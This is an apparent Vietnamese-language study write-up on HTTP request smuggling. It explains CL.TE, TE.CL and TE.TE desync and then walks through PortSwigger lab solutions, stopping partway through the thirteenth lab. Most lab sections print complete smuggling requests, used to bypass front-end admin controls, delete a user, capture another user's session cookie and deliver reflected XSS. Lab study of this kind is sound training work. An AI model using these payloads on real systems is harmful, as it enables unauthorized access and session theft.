# HTTP request smuggling

## Khái niệm & Khai thác & Phòng tránh

### Khái niệm

hai cuộc tấn công khác nhau nhắm vào các tiêu đề HTTP cụ thể:

- HTTP splitting
- HTTP smuggling

Cuộc tấn công đầu tiên khai thác sự thiếu lọc giá trị đầu vào cho phép kẻ xâm nhập chèn các ký tự CR và LF vào tiêu đề của phản hồi ứng dụng và ‘tách’ câu trả lời đó thành hai thông báo HTTP khác nhau. Mục tiêu của cuộc tấn công có thể khác nhau, từ nhiễm độc bộ nhớ cache cross site scripting.
Trong cuộc tấn công thứ hai, kẻ tấn công khai thác thực tế rằng một số thông điệp HTTP được tạo đặc biệt có thể được phân tích cú pháp và diễn giải theo những cách khác nhau tùy thuộc vào tác nhân nhận chúng

- **HTTP Request Smuggling** là một lỗ hổng bảo mật trong các ứng dụng web, mà nguyên nhân chính là sự không đồng nhất trong cách các máy chủ web và bộ định tuyến xử lý các yêu cầu HTTP đa luồng (HTTP pipelining).
  - Khi tấn công HTTP Splitting Smuggling, kẻ tấn công tận dụng sự không đồng nhất này để chèn các ký tự đặc biệt, chẳng hạn như các ký tự xuống dòng (line break), vào yêu cầu HTTP. Kết quả là, yêu cầu được chia nhỏ thành nhiều phần nhỏ hơn khi đi qua các lớp bảo mật, nhưng được ghép lại lại thành yêu cầu hoàn chỉnh tại máy chủ đích. Điều này có thể dẫn đến việc kẻ tấn công thực hiện các hành vi không mong muốn hoặc đánh lừa hệ thống.
- Các lỗ hổng liên quan đến HTTP request smuggling thường xuất hiện khi front-end và các máy chủ back-end có bất đồng trong việc xử lý các yêu cầu HTTP. Từ đó cho phép kẻ tấn công gửi hoặc đánh cắp một yêu cầu không xác định và ghép nó vào yêu cầu của người dùng tiếp theo.
  ![image](https://hackmd.io/_uploads/BkFVBGd6T.png)
- Bất cứ khi nào một HTTP request của client được phân tích bởi nhiều hơn một hệ thống thì đều có khả năng bị HTTP Request Smuggling
- Hầu hết các lỗ hổng **HTTP Request Smuggling** bị phát sinh do xoay quanh hai yếu tố trong header của gói tin HTTP đó là: **Content-Length** và **Transfer-Encoding**

### Khai thác

- Tấn công HTTP Request Smuggling nói chung đều xoay quanh đến hai header là Content-Length và Transfer-Encoding trên cùng một gói tin HTTP để máy chủ front-end và back-end xử lý yêu cầu theo cách khác nhau. Sau đây là một số “combo” thường gặp của HTTP Request Smuggling:

  - **CL.TE**: máy chủ front-end sử dụng header Content-Length và máy chủ back-end sử dụng header Transfer-Encoding.
  - **TE.CL**: máy chủ front-end sử dụng header Transfer-Encoding và máy chủ back-end sử dụng header Content-Length.
  - **TE.TE**: máy chủ front-end và back-end đều hỗ trợ header Transfer-Encoding, nhưng một trong hai loại máy chủ không xử ý được header này, do gói tin HTTP đã bị làm xáo trộn header theo một cách nào đó.

- Trong trường hợp giữa cache server và web server, kẻ tấn công có thể đầu độc cache server (cache poisoning). Điển hình là việc thay đổi nội dung lưu trong cache, chẳng hạn website A lại được lưu trữ dưới url B, vì thế khi client muốn truy cập vào website B thì lại nhận được nội dung của website A.
- Kẻ tấn công cũng có thể bypass được bộ lọc của Firewall, rồi gửi đi những request độc hại, nhằm tấn công web server.
- Nó cũng có thể được sử dụng để khai thác thứ cấp, bao gồm vượt qua tường lửa, đầu độc web cache poisoning một phần và tạo cross-site scripting (XSS).

![image](https://hackmd.io/_uploads/HJ_oDBOpT.png)

- Trong trường hợp client sử dụng một proxy server chia sẻ kết nối TCP đến web server, một khả năng có thể xảy ra đó là kẻ tấn công gửi request đến server với thông tin của một client khác. Kết hợp với một lỗ hổng của ứng dụng web (chẳng hạn XSS), kẻ tấn công có thể ăn cắp được thông tin của client đó.

![image](https://hackmd.io/_uploads/r1LxSSu6a.png)

Khi kẻ tấn công thực hiện thành công cuộc tấn công chuyển lậu yêu cầu, chúng sẽ đưa một yêu cầu HTTP độc hại vào máy chủ web , bỏ qua các biện pháp kiểm soát bảo mật nội bộ. Điều này có thể cho phép kẻ tấn công:

- Có quyền truy cập vào các tài nguyên được bảo vệ, chẳng hạn như bảng điều khiển dành cho quản trị viên
- Có được quyền truy cập vào dữ liệu nhạy cảm
- Khởi chạy các cuộc tấn công kịch bản chéo trang (XSS) mà không yêu cầu bất kỳ hành động nào từ người dùng
- Thực hiện chiếm đoạt thông tin xác thực

### Phòng tránh

- Để phòng chống HTTP Splitting Smuggling, cần kiểm tra và xử lý đúng cách các yêu cầu HTTP, đảm bảo đồng nhất trong cách xử lý yêu cầu tại máy chủ web và bộ định tuyến, và áp dụng các biện pháp bảo mật phù hợp.
- Sử dụng bộ lọc đầu ra (output filtering): Áp dụng bộ lọc đầu ra để loại bỏ hoặc mã hóa các ký tự đặc biệt trong phản hồi HTTP trước khi nó được gửi đến người dùng. Điều này giúp ngăn chặn các cuộc tấn công XSS và các hình thức tấn công khác sử dụng HTTP Splitting Smuggling
- Kiểm tra và cấu hình chính sách bảo mật HTTP: Kiểm tra và cấu hình chính sách bảo mật HTTP (HTTP Security Headers) cho ứng dụng web của bạn. Điều này bao gồm sử dụng các header như Strict-Transport-Security (HSTS), X-Content-Type-Options, X-XSS-Protection, và Content-Security-Policy để giới hạn các lỗ hổng bảo mật có thể bị khai thác.
- Áp dụng các biện pháp bảo vệ phía máy chủ: Thiết lập và cấu hình máy chủ web và bộ định tuyến một cách đúng cách để loại bỏ hoặc xử lý đúng cách các yêu cầu HTTP có chứa các ký tự đặc biệt và dấu phân cách.

## 1. Lab: HTTP request smuggling, basic CL.TE vulnerability

link: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

### Đề bài

![image](https://hackmd.io/_uploads/BypAOSu6T.png)

### Phân tích

- Phòng thí nghiệm này bao gồm một máy chủ front-end and back-end server, đồng thời máy chủ front-end không hỗ trợ mã hóa phân đoạn. Máy chủ front-end từ chối các yêu cầu không sử dụng phương thức GET hoặc POST.

- Để giải quyết bài lab, mình cần chuyển một yêu cầu đến máy chủ back-end để yêu cầu tiếp theo được xử lý bởi máy chủ back-end sử dụng phương thức `GPOST`.

### Khai thác

- Theo gợi ý của đề bài, front end server sử dụng CL để "cắt request", còn backend server thì sử dụng TE, vậy ta có thể áp dụng cách khai thác như sau:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

khi đó frontend server vẫn cho request qua đầy đủ với data dài 6 byte

0`\r` `\n`
`\r` `\n`
G

nhưng đến backend server nó sẽ sử lý TE hiểu như "GPOST" là request thứ 2 và báo **Unrecognized method GPOST.**

- front-end server sẽ hiểu body chứa 6 kí tự bắt đầu từ kí tự 0 đến kí tự G, trong khi back-end server hiểu body là 1 chunk size 0 nên terminate request đầu và chèn kí tự G vào request tiếp theo.

Gửi lần 1 → G được coi là kí tự đầu của request tiếp theo.

![image](https://hackmd.io/_uploads/BJcriIuaT.png)

- Gửi lần 2, G ghép với POST của request thành GPOST → front-end server coi đó là phương thức GPOST và forbidden.

![image](https://hackmd.io/_uploads/HkQ_PUuap.png)

và mục đích của chúng ta đã hoàn thành

![image](https://hackmd.io/_uploads/r1b3w8d6p.png)

### Burp scan

- mình quét lại bài lab với burp scan

![image](https://hackmd.io/_uploads/rkc3qHdTp.png)

và phát hiện lỗ hổng với 3 request

![image](https://hackmd.io/_uploads/rJ0ThB_pT.png)

đầu tiên burp gửi request với chunked size là **f** cùng với 25 byte trong phần body và response trả về thành công với mã 200

![image](https://hackmd.io/_uploads/rJ8QOUuaT.png)

tiếp đó burp gửi request thứ 2 kèm theo GET đến burp collaborator và response vẫn là 200 OK

![image](https://hackmd.io/_uploads/rkQXtUu6p.png)

cuối cùng là request 3 giống với request 1 nhưng lần này kết quả là 404 Not Found

![image](https://hackmd.io/_uploads/SJgZ9Uup6.png)

![image](https://hackmd.io/_uploads/HJdWqL_pa.png)

do bất đồng bộ trong việc sử lý request nên gói tin về đến server backend nó hiểu request thứ 2 gồm 2 gói tin và khi request thứ 3 gửi đi thì response của gói tin GET từ request thứ 2 mới được trả về

## 2. Lab: HTTP request smuggling, basic TE.CL vulnerability

link: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

### Đề bài

![image](https://hackmd.io/_uploads/HyWL38OTa.png)

### Phân tích

- Bài này là dạng TE.CL.
- Để giải quyết bài lab, mình cần chuyển một yêu cầu đến máy chủ back-end để yêu cầu tiếp theo được xử lý bởi máy chủ back-end sử dụng phương thức `GPOST`.

### Khai thác

mình dùng request như sau

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

- Lúc này, front-end server coi body là 2 chunked size `5a`, chunked size `5a` sẽ chứa:

```http
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 13\r\n
\r\n
a
```

Trong khi đó, back-end server sẽ coi body có 4 kí tự 5a`\r` `\n` → Phần còn lại sẽ được gán vào đầu request sau.

![image](https://hackmd.io/_uploads/H1KkUPu6T.png)

Gửi lần 2 ta thấy request chứa GPOST đã được gửi và xử lí.

![image](https://hackmd.io/_uploads/SyfgIPdpa.png)

và mục đích của chúng ta đã được thực hiện

![image](https://hackmd.io/_uploads/HJpB5w_6p.png)

### Burp scan

- mình quét lại bài lab với burp scan

![image](https://hackmd.io/_uploads/ryXD-POTT.png)

và phát hiện lỗ hổng với 2 request

- với request đầu tiên dùng trunked và gửi kèm POST đến burp collabrator
- khi đến backend server nó sẽ xử lý content-lengh = 24 là từ dòng 19 đến hết dòng thứ 21

![image](https://hackmd.io/_uploads/rymcbDua6.png)

- kết quả response trả về thành công 200 OK

và với request thứ 2 gửi như bình thường và nhận được response lỗi 504 do nó trả về response từ request POST gửi đến burp collabrator không thành công

![image](https://hackmd.io/_uploads/Ski5WDdpT.png)

![image](https://hackmd.io/_uploads/H1DjWvOaT.png)

## 3. Lab: HTTP request smuggling, obfuscating the TE header

link: https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header

### Đề bài

![image](https://hackmd.io/_uploads/HyCkhVYa6.png)

### Phân tích

- tương tự 2 bài trước chúng ta cần gửi Phương thức GPOST đến máy chủ backend
- Cả front-end và back-end server đều hỗ trợ Transfer-Encoding và ignore Content-Length.

### Khai thác

- Tuy nhiên khi thêm 1 header `Transfer-Encoding: cow` thì lại trigger được smuggling sau khi gửi 2 lần. → Trong khi front-end chấp nhận `Transfer-Encoding: chunked` đầu tiên thì back-end chấp nhận `Transfer-Encoding: cow` → Back-end phải sử dụng Content-Length do `Transfer-Encoding: cow` không hợp lệ.

với request

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

Lúc này ta quay về bài toán TE.CL

![image](https://hackmd.io/_uploads/Sk5RgSF6p.png)

![image](https://hackmd.io/_uploads/rJUJWBtaT.png)

và mục đích của chúng ta đã hoàn thành

![image](https://hackmd.io/_uploads/SJpSfBYpa.png)

### Burp scan

- mình quét lại bài lab với burp scan

![image](https://hackmd.io/_uploads/BkmEyrYTp.png)

và phát hiện lỗ hổng với 2 request
và giống như chúng ta đã khai thác ở request đầu gửi request với 2 http header `Transfer-Encoding: ` 1 cái hợp lệ 1 cái thì không hợp lệ và response trả kết quả 200 OK

![image](https://hackmd.io/_uploads/rkC9krYap.png)

và với request thứ 2 gửi như bình thường và nhận được response lỗi 504 do nó trả về response từ request POST gửi đến burp collabrator không thành công

![image](https://hackmd.io/_uploads/rJXpyrKaT.png)

![image](https://hackmd.io/_uploads/SyOJgrY6a.png)

## 4. Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

link: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses

### Đề bài

![image](https://hackmd.io/_uploads/SkELp4jaa.png)

### Phân tích

- biết máy chủ frontend không hỗ trợ chunked encoding
- để solve lab mình cần gửi request đến máy chủ backend trigger được lỗi 404

### Khai thác

- Để xác định đây là dạng CL.TE, ta gửi request sau:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

![image](https://hackmd.io/_uploads/rJOIerj6T.png)

Gửi request trang chủ một cách thông thường → bị trả 404 do bị smuggling.

![image](https://hackmd.io/_uploads/H1_IgSj6T.png)

và lab của chúng ta đã được solve

![image](https://hackmd.io/_uploads/Sk-AWBiT6.png)

### Burp scan

- mình quét lại bài lab với burp scan

![image](https://hackmd.io/_uploads/S1ukeBjap.png)

- đầu tiên burp gửi request có Transfer-Encoding và trả về thành công 200 OK

![image](https://hackmd.io/_uploads/ryMxgrjTa.png)

tiếp đó gửi Transfer-Encoding kèm theo 1 http chèn bên trong để GET đến URL lỗi và kết quả vẫn 200 OK

![image](https://hackmd.io/_uploads/Bkk-gSs6a.png)

sau đó gửi với request thông thường và trigger được http smuggling

![image](https://hackmd.io/_uploads/rkY-ero6T.png)

![image](https://hackmd.io/_uploads/H1MzeSi6p.png)

## 5. Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

link: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

### Đề bài

![image](https://hackmd.io/_uploads/ryJmfSiTa.png)

### Phân tích

- biết máy chủ backend không hỗ trợ chunked encoding
- để solve lab mình cần gửi request đến máy chủ backend trigger được lỗi 404

### Khai thác

Để xác định đây là dạng TE.CL, ta gửi request sau:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

![image](https://hackmd.io/_uploads/HkrrVBip6.png)

![image](https://hackmd.io/_uploads/B1ZB4Sjpp.png)

và bài lab đã được solve

![image](https://hackmd.io/_uploads/SJP9ESjp6.png)

### Burp scan

- mình quét lại bài lab với burp scan

và phát hiện lỗ hổng với 2 request
và giống như chúng ta đã khai thác ở request đầu gửi request với 2 http header `Transfer-Encoding: ` 1 cái hợp lệ 1 cái thì không hợp lệ và response trả kết quả 200 OK

![image](https://hackmd.io/_uploads/SyriMBoT6.png)

![image](https://hackmd.io/_uploads/HJehGSjpp.png)

và với request thứ 2 gửi như bình thường và nhận được response lỗi 504 do nó trả về response từ request POST gửi đến burp collabrator không thành công

![image](https://hackmd.io/_uploads/BkuhMBjap.png)

![image](https://hackmd.io/_uploads/BkJ6zroaT.png)

## 6. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

link: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

### Đề bài

![image](https://hackmd.io/_uploads/rJi7rSiTT.png)

### Phân tích

- máy chủ frontend vi không hỗ trợ mã hóa phân đoạn. Có bảng quản trị tại /admin, nhưng máy chủ frontend chặn quyền truy cập vào bảng đó.

- Để giải quyết bài thí nghiệm, mình cần chuyển một yêu cầu đến máy chủ backend truy cập vào bảng quản trị và xóa người dùng carlos.

- Đường dẫn /admin đã bị block bởi front-end server.

![image](https://hackmd.io/_uploads/ryQB8Hspp.png)

Ta detect được ứng dụng bị dính HTTP Request Smuggling dạng CL.TE

Bây giờ ta dựa vào HTTP Request Smuggling để request đến /admin.

Thử GET /admin bằng HTTP Request Smuggling.

Ta thấy response ở request sau chứa nội dung trang /admin mà không còn bị block nữa. Tuy nhiên vì back-end server check thấy mình không phải là local users nên không thể dùng chức năng.

![image](https://hackmd.io/_uploads/B1orvBj66.png)

![image](https://hackmd.io/_uploads/S1vQDriT6.png)

### Khai thác

- Quan sát rằng yêu cầu hợp nhất đã /adminbị từ chối do không sử dụng tiêu đề `Host: localhost`

thì bị báo duplicate header Host với request sau.

![image](https://hackmd.io/_uploads/S1DEdHoa6.png)

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

![image](https://hackmd.io/_uploads/HJRgYSjpp.png)

- bây giờ bạn có thể truy cập bảng quản trị và chỉ cần xóa carlos

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

![image](https://hackmd.io/_uploads/rJ-3YHspT.png)

và lab đã được solve

![image](https://hackmd.io/_uploads/r1Cyqrjpp.png)

### Burp scan

- mình quét lại bài lab với burp scan

![image](https://hackmd.io/_uploads/Bydz5Bj66.png)

![image](https://hackmd.io/_uploads/r1-X9SoaT.png)

![image](https://hackmd.io/_uploads/B1uX5SjTp.png)

![image](https://hackmd.io/_uploads/SkCX5ropp.png)

## 7. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

link: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl

### Đề bài

![image](https://hackmd.io/_uploads/S1Dncro6p.png)

### Khai thác

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

![image](https://hackmd.io/_uploads/r1ZYsHop6.png)

Quan sát rằng yêu cầu hợp nhất đã /adminbị từ chối do không sử dụng tiêu đề `Host: localhost`.

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

![image](https://hackmd.io/_uploads/ryFpjHopp.png)

và chúng ta đã vào được trang quản tị giờ chỉ cần xóa người dùng carlos

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

![image](https://hackmd.io/_uploads/SJhb2riTT.png)

## 8. Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting

link: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

### Đề bài

![image](https://hackmd.io/_uploads/SJxKpBoTT.png)

### Phân tích

- Có bảng quản trị tại /admin, nhưng chỉ những người có địa chỉ IP 127.0.0.1 mới có thể truy cập được. Máy chủ frontend thêm tiêu đề HTTP vào các yêu cầu đến có chứa địa chỉ IP của chúng. Nó tương tự như X-Forwarded-Fortiêu đề nhưng có tên khác.

- Để giải quyết bài lab, mình cần chuyển một yêu cầu đến máy chủ back-end để lộ tiêu đề được máy chủ front-end thêm vào. Sau đó gửi yêu cầu đến máy chủ backend bao gồm tiêu đề đã thêm, truy cập bảng quản trị và xóa người dùng carlos.

- Ứng dụng có chức năng search. Khi search sẽ có một POST request chứa tham số search

![image](https://hackmd.io/_uploads/B1leoAsaa.png)

Duyệt đến /adminvà quan sát rằng bảng quản trị chỉ có thể được tải từ các tệp 127.0.0.1.

![image](https://hackmd.io/_uploads/BJl9sAopT.png)

Ta detect được đây là dạng CL.TE

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

![image](https://hackmd.io/_uploads/HklbhAs66.png)

Thử với `X-Forwarded-For` nhưng không thành công

![image](https://hackmd.io/_uploads/SJnH6Cjpa.png)

Vì response của POST search request này reflect chuỗi search → tấn công HTTP Request Smuggling bằng POST với search= → phần request sau sẽ được nối vào search= → Ta xem được headers của request sau mà phía frontend server gửi cho backend

![image](https://hackmd.io/_uploads/Sk7A0Aip6.png)

vậy ta xem được header cần tìm là `X-MmJSse-Ip: 42.117.139.94`

### Khai thác

```http
POST / HTTP/1.1
Host: 0a11000e0350f4bd80e68f6800360077.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-MmJSse-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

![image](https://hackmd.io/_uploads/rJsB1k3T6.png)

- thành công vào được trang quản trị
  Xóa user carlos.

```http
POST / HTTP/1.1
Host: 0a11000e0350f4bd80e68f6800360077.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-MmJSse-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

![image](https://hackmd.io/_uploads/Sk1skJ3pp.png)

và lab của chúng ta đã được solve

### Burp scan

- mình quét lại bài lab với burp scan

![image](https://hackmd.io/_uploads/ry24WJn6a.png)

![image](https://hackmd.io/_uploads/BkEvWJ3p6.png)

![image](https://hackmd.io/_uploads/Sk3P-khaa.png)

![image](https://hackmd.io/_uploads/B1z_ZJh66.png)

![image](https://hackmd.io/_uploads/B1ud-y2pa.png)

## 9. Lab: Exploiting HTTP request smuggling to capture other users' requests

link: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

### Đề bài

![image](https://hackmd.io/_uploads/SJjBzy36p.png)

### Phân tích

- Phòng thí nghiệm này bao gồm một máy frontend và backend, đồng thời máy chủ frontend không hỗ trợ mã hóa phân đoạn.

- Để giải quyết bài thí nghiệm, mình cần chuyển một yêu cầu đến máy backend khiến yêu cầu của người dùng tiếp theo được lưu trữ trong ứng dụng. Sau đó truy xuất yêu cầu của người dùng tiếp theo và sử dụng cookie của người dùng nạn nhân để truy cập vào tài khoản của họ.

- Ứng dụng có chức năng comment và mình có thể xem comment của bất kì ai.

### Khai thác

- Lợi dụng HTTP request smuggling dạng CL.TE, ta khến back-end xử lý request sau là post comment với trường comment rỗng → request sau của user khác sẽ bị nối vào trường comment này và hiển thị lên comment. Content-Length ở đây ta sẽ chỉnh sao cho comment hiển thị chứa cookie cần lấy.

```http
POST / HTTP/1.1
Host: 0aa8000d03aedbd686d0cab5005100a9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 269
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 590
Cookie: session=hN90Mo8HUsWEK8aZRax9ZX6zXEJQ0T2W

csrf=hkq4xHjbVWb0zXNaImbgOL1RsssvH6di&postId=10&name=123&email=a%40a.a&website=http%3A%2F%2Fa.com&comment=123
```

![image](https://hackmd.io/_uploads/BkgTn1npa.png)

- quay lại xem comment đã thấy request của user victim chứa cookie.

![image](https://hackmd.io/_uploads/HkfS3Jh66.png)

`Cookie: session=xxcj0YQXJ06eog8MJoSFa4rsB6D8cAiD`

Set cookie vào request, ta truy cập được account nạn nhân.

![image](https://hackmd.io/_uploads/BJgj2yhT6.png)

và lab đã được solve

![image](https://hackmd.io/_uploads/SJZY6yhp6.png)

## 10. Lab: Exploiting HTTP request smuggling to deliver reflected XSS

link: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

### Đề bài

![image](https://hackmd.io/_uploads/Hko-Ry3p6.png)

### Phân tích

- Ứng dụng dễ bị XSS phản ánh thông qua User-Agenttiêu đề.

- Để giải quyết bài lab, mình cần chuyển một yêu cầu đến máy chủ backend khiến yêu cầu của người dùng tiếp theo nhận được phản hồi có chứa khai thác XSS thực thi alert(1).

- Tại phần form post comment tại các post, giá trị trường User-Agent được thêm vào value của input hidden. Ta có thể dẽ dàng trigger XSS.

![image](https://hackmd.io/_uploads/Hkw6ye3T6.png)

![image](https://hackmd.io/_uploads/r11Mxgn6a.png)

### Khai thác

- Đây là dạng bài CL.TE nên ta sẽ dùng payload sau với User-Agent là XSS payload.

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

Khi đó request tiếp theo của nạn nhân sẽ thêm vào smuggled request ở trên → dính XSS

![image](https://hackmd.io/_uploads/r15Ole2ap.png)

![image](https://hackmd.io/_uploads/SkMCex2p6.png)

→ Ta solve được challenge.

![image](https://hackmd.io/_uploads/SyTS-l36p.png)

### Burp scan

- mình quét lại bài lab với burp scan

![image](https://hackmd.io/_uploads/Bkt-QJhTT.png)

![image](https://hackmd.io/_uploads/HyHGmJ2pa.png)

![image](https://hackmd.io/_uploads/BJDXXy2pa.png)

![image](https://hackmd.io/_uploads/B16Qm12Ta.png)

![image](https://hackmd.io/_uploads/SyXE712pT.png)

## 11. Lab: Response queue poisoning via H2.TE request smuggling

link: https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

### Đề bài

![image](https://hackmd.io/_uploads/rJ35Wenpp.png)

### Phân tích

- Lab này dễ bị yêu cầu chuyển lậu vì máy chủ ngoại vi hạ cấp các yêu cầu HTTP/2 ngay cả khi chúng có độ dài không rõ ràng.

- Để giải quyết bài lab, hãy xóa người dùng carlosbằng cách sử dụng cách đầu độc hàng đợi phản hồi để đột nhập vào bảng quản trị tại /admin. Người dùng quản trị sẽ đăng nhập khoảng 15 giây một lần.

- Kết nối tới back-end được đặt lại sau mỗi 10 yêu cầu, vì vậy đừng lo lắng nếu bạn rơi vào trạng thái xấu - chỉ cần gửi một vài yêu cầu bình thường để có kết nối mới.

### Khai thác

Smuggling complete request với đường dẫn không tồn tại thành công với chunked encoding → H2.TE

```http
POST / HTTP/2
Host: 0a6d0015036f77ef84a50e7100dc00ec.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
```

![image](https://hackmd.io/_uploads/BygYfx3a6.png)

Send request để poison response queue. Send liên tục cho đến khi nhận được response 302 chứa cookie → đây là response sau khi admin đăng nhập thành công.

## 12. Lab: CL.0 request smuggling

link: https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling

### Đề bài

![image](https://hackmd.io/_uploads/Bkzlwg2pp.png)

### Phân tích

- Phòng thí nghiệm này dễ bị tấn công trái phép theo yêu cầu CL.0. Máy chủ phụ trợ bỏ qua Content-Lengthtiêu đề trong các yêu cầu tới một số điểm cuối.

- Để giải quyết vấn đề lab, hãy xác định điểm cuối dễ bị tấn công, gửi yêu cầu đến back-end để truy cập vào bảng quản trị tại /admin, sau đó xóa người dùng carlos.

### Khai thác

- Tại request load các resources bị smuggled.

![image](https://hackmd.io/_uploads/ryGu_x36T.png)

Xóa user carlos.

```http
GET /resources/labheader/images/logoAcademy.svg HTTP/2
Host: 0aca003a03504830825a07d0009100cb.web-security-academy.net
Cookie: session=6YS52cjBCt8Sx0GyFG4ZBBYvKzb5Q1c5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: image/avif,image/webp,*/*
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0aca003a03504830825a07d0009100cb.web-security-academy.net/resources/labheader/css/academyLabHeader.css
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Length: 61

GET /admin/delete/?username=carlos HTTP/1.1
X: ta9huash7z
```

![image](https://hackmd.io/_uploads/HJUjOeh6a.png)

và lab đã được solve

![image](https://hackmd.io/_uploads/BkipughpT.png)

### Burp scan

- mình quét lại bài lab với burp scan

![image](https://hackmd.io/_uploads/r1gaKlh66.png)

![image](https://hackmd.io/_uploads/BkD6Fl26p.png)

![image](https://hackmd.io/_uploads/ByLCtlnaT.png)

## 13. Lab: Exploiting HTTP request smuggling to perform web cache deception

link: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception

### Đề bài

![image](https://hackmd.io/_uploads/Bk7Mcg3pT.png)

### Phân tích

Phòng thí nghiệm này bao gồm một máy chủ ngoại vi và phụ trợ, đồng thời máy chủ ngoại vi không hỗ trợ mã hóa phân đoạn. Máy chủ ngoại vi đang lưu trữ tài nguyên tĩnh.

Để giải quyết vấn đề lab, hãy thực hiện một cuộc tấn công chuyển lậu yêu cầu sao cho yêu cầu của người dùng tiếp theo khiến khóa API của họ được lưu vào bộ đệm. Sau đó lấy khóa API của người dùng nạn nhân từ bộ đệm và gửi nó dưới dạng giải pháp thí nghiệm. Bạn sẽ phải đợi 30 giây kể từ khi truy cập phòng thí nghiệm trước khi cố gắng lừa nạn nhân lưu khóa API của họ vào bộ nhớ đệm.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau:wiener:peter

### Khai thác

- Tương tự, các request load resources đều được cached.
- Sau khi đăng nhập ta có thể xem API key tại /my-account.

